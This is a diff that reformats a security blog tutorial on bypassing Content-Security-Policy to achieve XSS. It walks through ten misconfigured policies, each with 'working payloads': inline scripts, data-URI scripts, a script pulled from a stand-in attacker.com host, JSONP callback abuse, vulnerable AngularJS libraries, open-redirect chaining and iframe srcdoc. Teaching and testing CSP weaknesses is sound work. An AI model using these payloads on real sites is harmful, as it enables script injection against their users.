@@ -106,6 +106,7 @@ Content-Security-Policy: default-src 'self'; img-src https://*; child-src 'none'
 ```
 Administrators can track which kind of attack scripts or techniques are used by attackers to load malicious content from untrusted resources. Now, let's move to the interesting part **Bypassing Techniques**:
 Analyze the CSP policy properly. There are few online tools that are very helpful.
+
 ```
 1. https://csp-evaluator.withgoogle.com/
 2. https://cspvalidator.org/
@@ -114,42 +115,86 @@ Analyze the CSP policy properly. There are few online tools that are very helpfu
 
 Below is the screenshot of how they evaluate and provide you results.
 ![Scenario 1](https://miro.medium.com/max/1400/1*UqmPG_15m90O6glKsTdvXw.png)
-Scenario : 1
+
+**Scenario : 1**
+```
 Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*; child-src 'none'; report-uri /Report-parsing-url;
+
+```
 By observing this policy we can say it's damn vulnerable and will allow inline scripting as well . The reason behind that is the usage of unsafe-inline source as a value of script-src directive.
-working payload : "/><script>alert(1337);</script>
-Scenario : 2
+
+**working payload**: "/><script>alert(1337);</script>
+
+**Scenario : 2**
+
+```
 Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none'; report-uri /Report-parsing-url;
+
+```
 Again this is a misconfigured CSP policy due to usage of unsafe-eval.
-working payload : 
+
+**working payload** : 
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
-Scenario : 3
+
+**Scenario : 3**
+
+```
 Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *; child-src 'none'; report-uri /Report-parsing-url;
+
+```
 Again this is a misconfigured CSP policy due to usage of a wildcard in script-src.
-working payloads :
+***working payloads*** :
+``
 "/>'><script src=https://attacker.com/evil.js></script>
 "/>'><script src=data:text/javascript,alert(1337)></script>
-Scenario: 4
+
+``
+**Scenario: 4**
+```
 Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;
+
+```
 Misconfigured CSP policy again! we can see object-src and default-src are missing here.
-working payloads :
+**working payloads** :
+```
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
 <param name="AllowScriptAccess" value="always"></object>
-Scenario: 5
+
+```
+**Scenario:** 5
+
+```
 Content-Security-Policy: script-src 'self'; object-src 'none' ; report-uri /Report-parsing-url;
+
+```
 we can see object-src is set to none but yes this CSP can be bypassed too to perform XSS. How ? If the application allows users to upload any type of file to the host. An attacker can upload any malicious script and call within any tag.
-working payloads :
+**working payloads** :
+```
 "/>'><script src="/user_upload/mypic.png.js"></script>
-Scenario : 6
+
+```
+**Scenario** : 6
+```
 Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none' ; report-uri /Report-parsing-url;
+```
 In such scenarios where script-src is set to self and a particular domain which is whitelisted, it can be bypassed using jsonp. jsonp endpoints allow insecure callback methods which allow an attacker to perform xss.
-working payload :
+
+**working payload** :
+```
 "><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
-Scenario : 7
+
+```
+**Scenario** : 7
+
+```
 Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none' ; report-uri /Report-parsing-url;
+
+```
 In such scenarios where script-src is set to self and a javascript library domain which is whitelisted. It can be bypassed using any vulnerable version of javascript file from that library , which allows the attacker to perform xss.
-working payloads :
+
+**working payloads** :
+```
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
  
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
@@ -159,26 +204,52 @@ working payloads :
 "><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
 "><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
 <div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
-Scenario : 8
+
+```
+**Scenario** : 8
+
+```
 Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
+
+```
+
 If the application is using angular JS and scripts are loaded from a whitelisted domain. It is possible to bypass this CSP policy by calling callback functions and vulnerable class. For more details visit this awesome git repo.
-working payloads :
+
+**working payloads** :
+```
 ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
 "><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
-Scenario : 9
+
+```
+**Scenario** : 9
+```
 Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com ; object-src 'none' ; report-uri /Report-parsing-url;
+
+```
 In the above scenario, there are two whitelisted domains from where scripts can be loaded to the webpage. Now if one domain has any open redirect endpoint CSP can be bypassed easily. The reason behind that is an attacker can craft a payload using redirect domain targeting to other whitelisted domains having a jsonp endpoint. And in this scenario XSS will execute because while redirection browser only validated host, not the path parameters.
-working payload :
-">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>">
-Scenario : 10
+**working payload** :
+```
+">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>"> 
+
+```
+**Scenario** : 10
+```
 Content-Security-Policy: 
 default-src 'self' data: *; connect-src 'self'; script-src  'self' ;
 report-uri /_csp; upgrade-insecure-requests
+
+```
 THE above CSP policy can be bypassed using iframes. The condition is that application should allow iframes from the whitelisted domain. Now using a special attribute srcdoc of iframe, XSS can be easily achieved.
-working payloads :
+
+**working payloads** :
+```
 <iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
+
+```
 * sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)
+```
 <iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
+
+```
 I hope you enjoyed reading this. Special thanks to @mikispag & @we1x for their contribution to Google Security research in the domain of Content Security Policy secure implementation.
-Thank You!
-For any feedback or suggestions reach out to me @Bhavesh_Thakur_
+Thank You! For any feedback or suggestions reach out to me @Bhavesh_Thakur_
